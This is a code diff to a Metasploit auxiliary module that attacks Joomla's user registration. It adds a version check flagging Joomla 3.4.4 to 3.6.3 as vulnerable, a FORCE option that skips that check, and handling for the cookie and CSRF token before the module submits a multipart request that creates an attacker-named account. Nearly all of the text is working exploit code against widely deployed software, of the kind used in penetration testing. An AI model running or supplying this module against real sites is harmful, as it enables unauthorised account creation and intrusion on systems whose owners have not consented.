@@ -37,10 +37,33 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),
         OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
         OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
-        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
+        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com']),
+        OptString.new('FORCE', [true, 'Force bypass checks', 'false'])
       ]
     )
-    deregister_options('VHOST')
+  end
+
+  def check
+    res = send_request_cgi({'uri' => target_uri.path })
+
+    unless res
+      print_error("Connection timed out")
+      return Exploit::CheckCode::Unknown
+    end
+
+    online = joomla_and_online?
+    unless online
+      print_error("Unable to detect joomla on #{target_uri.path}")
+      return Exploit::CheckCode::Safe
+    end
+
+    version = Gem::Version.new(joomla_version)
+    unless version.nil?
+      print_status("Detected Joomla version #{joomla_version}")
+      return Exploit::CheckCode::Appears if version >= Gem::Version.new('3.4.4') && version <= Gem::Version.new('3.6.3')
+    end
+
+    return Exploit::CheckCode::Detected if online
   end
 
   def get_csrf(hidden_fields)
@@ -55,6 +78,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    if datastore['FORCE'] == 'false'
+      if check == Exploit::CheckCode::Safe
+        print_error('Target seems safe, so we will not continue!')
+        return
+      end
+    end
+
     print_status("Trying to create the user!")
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
@@ -63,8 +93,18 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    cookie = res.get_cookies
-    csrf = get_csrf(res.get_hidden_inputs)
+    if res && res.code == 200
+      cookie = res.get_cookies
+      csrf = get_csrf(res.get_hidden_inputs)
+
+      if csrf.length != 32 && cookie.split(/=/).length != 2
+        print_error('Could not find csrf or cookie!')
+        return
+      end
+    else
+      print_error('Could not find Login Page!')
+      return
+    end
 
     mime = Rex::MIME::Message.new
     mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[name]"')
